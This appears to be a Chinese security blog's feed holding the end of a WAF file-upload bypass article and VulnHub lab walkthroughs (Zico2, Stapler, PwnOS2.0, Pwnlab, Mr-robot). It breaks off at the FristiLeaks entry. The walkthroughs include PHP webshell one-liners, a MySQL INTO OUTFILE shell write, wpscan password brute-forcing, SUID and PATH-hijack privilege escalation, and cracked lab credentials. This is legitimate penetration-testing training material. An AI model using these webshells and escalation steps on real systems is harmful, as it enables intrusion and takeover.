alt="image-20211104135831748"></p><p>上传的都是绕过了黑白名单限制的后缀。</p><p>Tips：对网站爆破可能会被封锁IP，可以通过burp的fakeip插件或者动态ip进行一定程度的缓解。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WAF的绕过方法有很多种，但是思路大致就是上文提到的内容，将各种方法结合使用往往就能对WAF进行有效地绕过。</p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>对于垃圾数据填充，可以通过content!进行一定程度的防御</li><li>限制上传文件名的最大长度</li><li>对<code>; &#39; &quot; /</code>等特殊字符进行限制</li><li>对文件名中的00进行匹配</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;漏洞。如果有，搜索对应的利用方法。</li><li>查找文件上传点，找到后，先上传普通的文件进行测试，筛选，接着对过滤方法进行猜测，针对不同的过滤采用不同的绕过方法。</li></ul><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>识别方法：</p><ul><li>云悉</li><li>whatweb</li><li>御剑识别</li><li>文件md5值</li><li>F12数据包</li><li>robots.txt</li></ul><h3 id="编辑器-1"><a href="#编辑器-1" class="headerlink" title="编辑器"></a>编辑器</h3><ul><li>通过url或者UI界面内容进行识别</li></ul><h3 id="其他-CVE"><a href="#其他-CVE" class="headerlink" title="其他&#x2F;CVE"></a>其他&#x2F;CVE</h3><ul><li>关注CVE官网，漏洞库等</li></ul>]]></content>
    
    
    <categories>
      
      <category>OWASP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Zico2</title>
    <link href="/2023/04/26/vulnhub-Zico2/"/>
    <url>/2023/04/26/vulnhub-Zico2/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-Zico2"><a href="#vulnhub-Zico2" class="headerlink" title="vulnhub_Zico2"></a>vulnhub_Zico2</h1><p>arp-scan+masscan扫端口：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085304660.png" alt="image-20230309085304660"></p><p>nmap扫服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085425386.png" alt="image-20230309085425386"></p><p>开放了22，80，111，50670等端口。</p><p>尝试ssh弱口令，失败：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091310662.png" alt="image-20230309091310662"></p><p>访问80端口的http服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091518406.png" alt="image-20230309091518406"></p><p>点击各类功能点，发现如下页面，page&#x3D;xxx:</p><p><img src="/2023/04/27/file-upload/2/image-20230309091602675.png" alt="image-20230309091602675"></p><p>尝试本地文件包含，存在漏洞：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091624462.png" alt="image-20230309091624462"></p><p>dirsearch爆破后台目录：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091822847.png" alt="image-20230309091822847"></p><p>发现&#x2F;dbadmin，访问路径：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091837154.png" alt="image-20230309091837154"></p><p>发现phpliteadmin，尝试弱口令admin：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095117322.png" alt="image-20230309095117322"></p><p>登录成功：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095224609.png" alt="image-20230309095224609"></p><p>首先想到查询数据，选择csv格式导出：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095355218.png" alt="image-20230309095355218"></p><p>发现root和zico两个用户。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095433457.png" alt="image-20230309095433457"></p><p>md5解密：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095517231.png" alt="image-20230309095517231"></p><p>直接ssh登录root&#x2F;34root34，失败。</p><p>尝试寻找phpliteadmin漏洞，使用searchsploit搜索：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095627928.png" alt="image-20230309095627928"></p><p>存在代码注入漏洞，根据提示，需要新建数据库，新建表，就能执行php代码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095639243.png" alt="image-20230309095639243"></p><p>创建表，插入一条数据<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code></p><p><img src="/2023/04/27/file-upload/2/image-20230309100008129.png" alt="image-20230309100008129"></p><p>成功写入，再配合前面的本地文件包含，直接getshell，连上蚁剑。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100225528.png" alt="image-20230309100225528"></p><p>在home下，查找zico相关文件，发现wp配置，存在用户名密码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100615572.png" alt="image-20230309100615572"></p><p>弹shell到kali，生成交互shell，su zico，切换到zico用户：</p><p><img src="/2023/04/27/file-upload/2/image-20230309100803138.png" alt="image-20230309100803138"></p><p>sudo -l，发现tar，zip，直接提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Stapler</title>
    <link href="/2023/04/26/vulnhub-Stapler/"/>
    <url>/2023/04/26/vulnhub-Stapler/</url>
    
    <content type="html"><![CDATA[<h1 id="Stapler"><a href="#Stapler" class="headerlink" title="Stapler"></a>Stapler</h1><p>arp-scan发现目标主机：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232914512.png" alt="image-20230307232914512"></p><p>masscan全端口扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232942455.png" alt="image-20230307232942455"></p><p>nmap详细扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307233921356.png" alt="image-20230307233921356"></p><p><img src="/2023/04/27/file-upload/ler/image-20230307233945813.png" alt="image-20230307233945813"></p><p>开放了ftp,ssh,mysql,smb,http等服务。</p><p>ftp允许匿名登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234331021.png" alt="image-20230307234331021"></p><p>查看note文件内容:</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234345835.png" alt="image-20230307234345835"></p><p>这里提到一些用户名：Harry,Jojn,Elly.</p><p>ssh连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151213643.png" alt="image-20230308151213643"></p><p>新的用户名Barry。</p><p>尝试弱口令失败，暂时跳过。</p><p>enum4linux可以发现一些用户信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171948892.png" alt="image-20230308171948892"></p><p>对于smb协议，查看共享文件夹：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171639530.png" alt="image-20230308171639530"></p><p>可以访问kathy和tmp目录，均无有效信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171722902.png" alt="image-20230308171722902"></p><p>666端口服务为止，直接nc：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151340275.png" alt="image-20230308151340275"></p><p>可以看到message2.jpg。</p><p>接收文件并保存：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151442195.png" alt="image-20230308151442195"></p><p>发现为zip文件，改名解压：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151514679.png" alt="image-20230308151514679"></p><p>新用户名Scott.</p><p>收集到以上用户名之后尝试进行ssh和ftp服务的爆破。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308160218674.png" alt="image-20230308160218674"></p><p>ssh爆破失败，但是ftp爆破出elly&#x2F;ylle，登录后并无有用信息。</p><p>接下来把重点放在80和12380端口的http服务。</p><p>先看80：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085447584.png" alt="image-20230308085447584"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308085437715.png" alt="image-20230308085437715"></p><p>这里有两个配置文件，.bashrc和.profile，先下载到本地。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085713209.png" alt="image-20230308085713209"></p><p>无有用信息。</p><p>接下来尝试访问12380：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091700598.png" alt="image-20230308091700598"></p><p>无任何有效信息，访问robots.txt等目录，不发生跳转，返回400：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091802471.png" alt="image-20230308091802471"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091905800.png" alt="image-20230308091905800"></p><p>这里提到了&#x2F;admin112233,&#x2F;blogblog等目录，但是http访问后依然为400，nikto显示有ssl信息，使用https:</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092714929.png" alt="image-20230308092714929"></p><p>出现不同的页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092737735.png" alt="image-20230308092737735"></p><p>admin112233为xss页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092803364.png" alt="image-20230308092803364"></p><p>blogblog为博客页面。对该目录进行爆破：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093300771.png" alt="image-20230308093300771"></p><p>明显为wordpress框架。</p><p>上wpscan：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093434748.png" alt="image-20230308093434748"></p><p>提示SSL peer certificate or SSH remote key was not OK,可能是ssl证书有问题，disable：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308093703854.png" alt="image-20230308093703854"></p><p>问题解决。</p><p>扫一下用户名：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate u</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308160754290.png" alt="image-20230308160754290"></p><p>枚举出用户名后，直接大字典爆破密码：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks -eu -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161305127.png" alt="image-20230308161305127"></p><p>用得到的账号登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308161505638.png" alt="image-20230308161505638"></p><p>普通用户权限，非管理员，暂时跳过。</p><p>回到wpscan，对wordpress插件进行扫描，尝试利用插件漏洞，默认为被动扫描，要发现全部插件这里使用主动扫描，ap代表all plugins：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate ap --plugins-detection aggressive</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161957394.png" alt="image-20230308161957394"></p><p>扫出了图中部分插件。经过尝试，advanced-video-embed-embed-videos-or-playlists存在漏洞。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162206276.png" alt="image-20230308162206276"></p><p>在EDB中寻找poc，查看python文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162257243.png" alt="image-20230308162257243"></p><p>这里修改url为靶机的地址，运行报错：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162346333.png" alt="image-20230308162346333"></p><p>修改poc，导入ssl，并且加上<code>ssl._create_default_https_context = ssl._create_unverified_context</code></p><p>再次运行，无回显。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162534743.png" alt="image-20230308162534743"></p><p>此时查看登录后的主页，发现出现了.jpg：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163901154.png" alt="image-20230308163901154"></p><p>尝试直接访问poc中的url：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163949595.png" alt="image-20230308163949595"></p><p>访问提示页面后出现404。</p><p>尝试访问jpeg文件，wordpress中一般存在&#x2F;wp-content&#x2F;uploads文件夹，访问后发现jpeg文件。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164229282.png" alt="image-20230308164229282"></p><p>直接wget下载文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164423023.png" alt="image-20230308164423023"></p><p>ssl证书有问题，加上参数–no-check-certificate后解决。</p><p>查看文件内容：<br><img src="/2023/04/27/file-upload/ler/image-20230308164459634.png" alt="image-20230308164459634"></p><p>jpeg文件内容为config文件，包含了数据库配置信息。</p><p>直接登录数据库，找到用户表：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164621458.png" alt="image-20230308164621458"></p><p>注意John用户存在user_url，可能为管理员权限。</p><p>将用户名密码简单处理后如下：<br><img src="/2023/04/27/file-upload/ler/image-20230308164722763.png" alt="image-20230308164722763"></p><p>用john跑密码：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165310180.png" alt="image-20230308165310180"></p><p>用John&#x2F;incorrect登录后台：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165344905.png" alt="image-20230308165344905"></p><p>成功获得管理员权限。</p><p>尝试寻找上传点传马或者改服务端文件，在插件处发现可以上传文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165444017.png" alt="image-20230308165444017"></p><p>直接上传，到uploads目录查看，上传成功：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165511905.png" alt="image-20230308165511905"></p><p>这里如果没找到上传点，可以直接用mysql写马：</p><p><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;/var/www/https/blogblog/wp-content/uploads/cmd1.php</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174104145.png" alt="image-20230308174104145"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174122155.png" alt="image-20230308174122155"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308174138286.png" alt="image-20230308174138286"></p><p>连蚁剑，注意需要忽略https证书，不然会连接失败：</p><img src="vulnhub-Stapler/image-20230308165627564.png" alt="image-20230308165627564" style="zoom:50%;" /><p>成功连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308165610387.png" alt="image-20230308165610387"></p><p>弹shell到kali，pty：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170259336.png" alt="image-20230308170259336"></p><p>home目录下存在很多文件夹，内容都为空。</p><p>查看一下history文件，由于存在很多exit命令，使用grep排除：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170545936.png" alt="image-20230308170545936"></p><p>发现peter和JKanode用户的密码。</p><p>JKanode：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170814399.png" alt="image-20230308170814399"></p><p>peter：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308170939917.png" alt="image-20230308170939917"></p><p>直接sudo提权，可以执行任意命令，拿到flag。</p><p>同时拿到www低权限之后，可以使用CVE-2021-4034提权，几乎通杀：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171520442.png" alt="image-20230308171520442"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_PwnOS2.0</title>
    <link href="/2023/04/26/vulnhub-PwnOS2-0/"/>
    <url>/2023/04/26/vulnhub-PwnOS2-0/</url>
    
    <content type="html"><![CDATA[<h1 id="PwnOS2-0"><a href="#PwnOS2-0" class="headerlink" title="PwnOS2.0"></a>PwnOS2.0</h1><p>首先nmap扫描端口，发现22，25，80，110等开放：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321135938360.png" alt="image-20230321135938360"></p><p>nikto扫一下80的http服务：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140053612.png" alt="image-20230321140053612"></p><p>发现了一些敏感目录。</p><p>info目录为phpinfo:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140123549.png" alt="image-20230321140123549"></p><p>includes:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140140442.png" alt="image-20230321140140442"></p><p>login.php为登录页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140320230.png" alt="image-20230321140320230"></p><p>register.php为注册页面：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140330516.png" alt="image-20230321140330516"></p><p>注册用户<a href="mailto:&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x61;&#97;&#97;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a>，未发现有用信息。</p><p>接下来考虑通过login.php来getshell，在email字段输入单引号，报错：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140613604.png" alt="image-20230321140613604"></p><p>明显存在sql注入，并且报错提示数据库为mysql。</p><p>burp抓包直接跑sqlmap，加上–dbms mysql参数：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321140853513.png" alt="image-20230321140853513"></p><p>存在注入，–dump，查看user&#x2F;pass：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141528736.png" alt="image-20230321141528736"></p><p><a href="mailto:&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;">&#97;&#97;&#x61;&#x40;&#113;&#113;&#46;&#99;&#111;&#109;</a>是注册的测试账号，尝试使用<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;">&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x69;&#x73;&#x69;&#x6e;&#116;&#x73;&#x2e;&#99;&#x6f;&#109;</a>账号登录&#x2F;</p><p>密码为md5，解开后为killerbeesareflying，登录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141719166.png" alt="image-20230321141719166"></p><p>登录成功，但是没有可用信息，回到sqlmap，直接–os-shell:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321141951074.png" alt="image-20230321141951074"></p><p>成功拿到shell，为www-data权限，但是此处的shell无法弹到kali。</p><p>在kali上寻找php马，传到靶机上：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142452841.png" alt="image-20230321142452841"></p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142229760.png" alt="image-20230321142229760"></p><p>本地开启监听，成功连上靶机：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142252180.png" alt="image-20230321142252180"></p><p>在当前目录下发现mysqli_connect.php文件，并发现密码root&#x2F;goodday:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142626934.png" alt="image-20230321142626934"></p><p>尝试登录mysql，失败，登录ssh同样失败。</p><p>回到上级目录，也存在mysqli_connect.php文件，查看发现另一组账号root&#x2F;root@ISIntS:</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142650060.png" alt="image-20230321142650060"></p><p>ssh登录，成功拿到root权限：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321142837619.png" alt="image-20230321142837619"></p><p>同时该密码可以登录mysql，因此尝试udf提权。</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155456474.png" alt="image-20230321155456474"></p><p>首先查看secure_file_priv，如果值为空，则可以提权：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155715082.png" alt="image-20230321155715082"></p><p>接下来查看compile选项：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155755619.png" alt="image-20230321155755619"></p><p>linux，64位。</p><p>最后查看plugin路径，如果没有需要自行创建，此处存在：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321155836405.png" alt="image-20230321155836405"></p><p>使用sqlmap直接将udf.so文件传到plugin目录：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143053212.png" alt="image-20230321143053212"></p><p>此处的so文件使用的是msf自带的，如果使用sqlmap中的，需要先进行解码。</p><p>msf中路径为：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321160832973.png" alt="image-20230321160832973"></p><p>分别对应了linux和windows中的32&#x2F;64位文件，此处使用的是lib_mysqludf_sys_64.so。</p><p>上传之后，默认会多出一个sys_eval方法，但是不会回显，再手动添加一次，returns string：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321153548843.png" alt="image-20230321153548843"></p><p>此时查询方法，存在sys_eval，执行whoami，是root权限，提权成功。</p><p>为了后续操作，给find加上suid：</p><p><img src="/2023/04/27/file-upload/S2-0/image-20230321143316978.png" alt="image-20230321143316978"></p><p>从www-data权限，使用suid提权，<code>touch 1.txt, find 1.txt -exec &#39;/bin/sh&#39; \;</code>，成功提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Pwnlab</title>
    <link href="/2023/04/26/vulnhub-Pwnlab/"/>
    <url>/2023/04/26/vulnhub-Pwnlab/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwnlab"><a href="#Pwnlab" class="headerlink" title="Pwnlab"></a>Pwnlab</h1><p>nmap扫端口&amp;服务：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323110917405.png" alt="image-20230323110917405"></p><p>主要是rpc和80端口的http服务。</p><p>使用rpcinfo进行探测：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111530034.png" alt="image-20230323111530034"></p><p>无有效信息。</p><p>dirsearch爆破后台敏感目录：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323111545504.png" alt="image-20230323111545504"></p><p>首先直接访问80端口：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134559022.png" alt="image-20230323134559022"></p><p>访问&#x2F;upload:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134621886.png" alt="image-20230323134621886"></p><p>很明显为上传的文件。</p><p>接着访问&#x2F;upload.php:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134633666.png" alt="image-20230323134633666"></p><p>提示需要登录。</p><p>接下来访问login页面，出现登录框：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323134652498.png" alt="image-20230323134652498"></p><p>burp抓包：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135618265.png" alt="image-20230323135618265"></p><p>输入单引号，无变化，保存报文内容跑sqlmap，无果。</p><p>对&#x2F;login.php进行同样的尝试：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135734466.png" alt="image-20230323135734466"></p><p>同样失败。</p><p>尝试对upload发送options请求：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323135830977.png" alt="image-20230323135830977"></p><p>不允许put方法，无法直接写马。</p><p>仔细观察流量，发现登录页面的url为&#x2F;?page&#x3D;login，考虑存在文件包含漏洞。</p><p>直接尝试&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140414126.png" alt="image-20230323140414126"></p><p>无回显。</p><p>尝试伪协议读取源码。目前url为<a href="http://192.168.59.30/index.php?page=login%EF%BC%8C%E8%80%8Cconfig.php%E4%B8%BAhttp://192.168.59.30/config.php%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9C%80%E8%A6%81%E8%BF%94%E5%9B%9E%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%EF%BC%9A">http://192.168.59.30/index.php?page=login，而config.php为http://192.168.59.30/config.php，因此需要返回一级目录：</a></p><p><img src="/2023/04/27/file-upload/ab/image-20230323140649744.png" alt="image-20230323140649744"></p><p>成功读取，base64解密：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323140713926.png" alt="image-20230323140713926"></p><p>得到数据库的账号密码，连接数据库：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141140279.png" alt="image-20230323141140279"></p><p>base64解密后，得到kent，mike和kane3个用户的密码。ssh连接失败，端口未开放：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323141906558.png" alt="image-20230323141906558"></p><p>无法直接ssh，因此登录尝试文件上传：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323142523888.png" alt="image-20230323142523888"></p><p>上传php马，提示不允许的后缀，只能上传图片。</p><p>首先考虑apache多后缀解析漏洞，上传pwnlab.php.jpg:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144220196.png" alt="image-20230323144220196"></p><p>未绕过。</p><p>接下来考虑上传图片马，再配合解析漏洞或者文件包含漏洞将其作为php文件解析。</p><p>&#x2F;index.php?page&#x3D;xxx该处存在文件包含漏洞，读取index.php源码：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144332964.png" alt="image-20230323144332964"></p><p>base64 decode：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144356432.png" alt="image-20230323144356432"></p><p>这里如果cookie中lang参数又存在文件包含。</p><p>先制作图片马，echo -e代表允许反斜杠解析，GIF89a为gif文件的文件头：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323144857630.png" alt="image-20230323144857630"></p><p>上传成功：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145006507.png" alt="image-20230323145006507"></p><p>在cookie中输入gif文件的url，将php马包含，kali开启监听：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145136383.png" alt="image-20230323145136383"></p><p>成功获取shell。</p><p>当前为www-data权限，通过前面获取的账号密码，可以登录到kent和kane账户。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323145609941.png" alt="image-20230323145609941"></p><p>kent目录下无文件，切换到kane，发现msgmike。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150733143.png" alt="image-20230323150733143"></p><p>msgmike为elf可执行文件，并且有suid，strings查看发现存在命令cat &#x2F;home&#x2F;mike&#x2F;msg.txt。</p><p>直接运行：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323150837248.png" alt="image-20230323150837248"></p><p>提示无cat文件。因此直接新建cat文件，内容为&#x2F;bin&#x2F;bash，并且将$PATH参数修改，默认先使用我们新建的cat：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323151050920.png" alt="image-20230323151050920"></p><p>成功提权到mike，此时记得将$PATH恢复。</p><p>进入&#x2F;home&#x2F;mike目录下，存在msg2root文件，通过命名判断，需要通过该文件从mike提权到root权限。</p><p>将msg2root放入ida：</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152452183.png" alt="image-20230323152452183"></p><p>发现system函数。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152547004.png" alt="image-20230323152547004"></p><p>并且msg2root为root权限，因此考虑直接使用msg2root执行&#x2F;bin&#x2F;bash命令拿到root shell。</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152844893.png" alt="image-20230323152844893"></p><p>这里类似于远程代码执行漏洞，通过；截断即可执行命令，&#x2F;bin&#x2F;bash失败，尝试&#x2F;bin&#x2F;sh:</p><p><img src="/2023/04/27/file-upload/ab/image-20230323152925140.png" alt="image-20230323152925140"></p><p>成功。经过尝试&amp;等符号同样可行。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Mr-robot</title>
    <link href="/2023/04/26/vulnhub-Mr-robot/"/>
    <url>/2023/04/26/vulnhub-Mr-robot/</url>
    
    <content type="html"><![CDATA[<h1 id="Mr-robot"><a href="#Mr-robot" class="headerlink" title="Mr-robot"></a>Mr-robot</h1><p>nmap扫描，开放了80和443端口：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143637974.png" alt="image-20230322143637974"></p><p>浏览器访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322143728895.png" alt="image-20230322143728895"></p><p>后台目录爆破：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145023429.png" alt="image-20230322145023429"></p><p>发现robots.txt，访问：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145306410.png" alt="image-20230322145306410"></p><p>发现两个文件,fsocity.dic，key-1-of-3.txt，分别查看：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145336763.png" alt="image-20230322145336763"></p><p>其中fsocity.dic是一个字典，有80万行，接着访问key：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145351085.png" alt="image-20230322145351085"></p><p>看似为md5值，md5解密失败，从名称判断应该是3个key中的第一个。</p><p>dirsearch还发现了wp-login等目录，判断该网站为word press。</p><p>结合dic字典，进行账号爆破。首先对字典进行去重：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322145213115.png" alt="image-20230322145213115"></p><p>去重后保存到new文件，有1万多行数据。</p><p>首先从lostpassword页面爆破用户名：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150401225.png" alt="image-20230322150401225"></p><p>对结果进行关键字匹配，成功爆破出Elliot。</p><p>使用该用户名，继续爆破密码：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150604710.png" alt="image-20230322150604710"></p><p>爆破出密码ER28-0652。</p><p>登录后台：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322150644787.png" alt="image-20230322150644787"></p><p>在appearance模块中可以编辑php文件，最简单的方法是修改404.php，将马复制到404.php，任意输入不存在的url，报错，连接成功：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151001633.png" alt="image-20230322151001633"></p><p>此时为daemon权限。</p><p>进入home，发现存在robot目录，发现password.raw-md5，解密后得到robot用户的密码，并且成功得到第二个key。</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151015498.png" alt="image-20230322151015498"></p><p>接下来继续提权到root，sudo -l无可用命令，上传检查脚本：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151033460.png" alt="image-20230322151033460"></p><p>发现nmap有suid：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151207435.png" alt="image-20230322151207435"></p><p>nmap –interactive进入交互模式，起shell：</p><p><img src="/2023/04/27/file-upload/obot/image-20230322151416138.png" alt="image-20230322151416138"></p><p>成功拿到root权限，得到第三个key。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_FristiLeaks_1.3</title>
    <link href="/2023/04/26/vulnhub-FristiLeaks-1-3/"/>
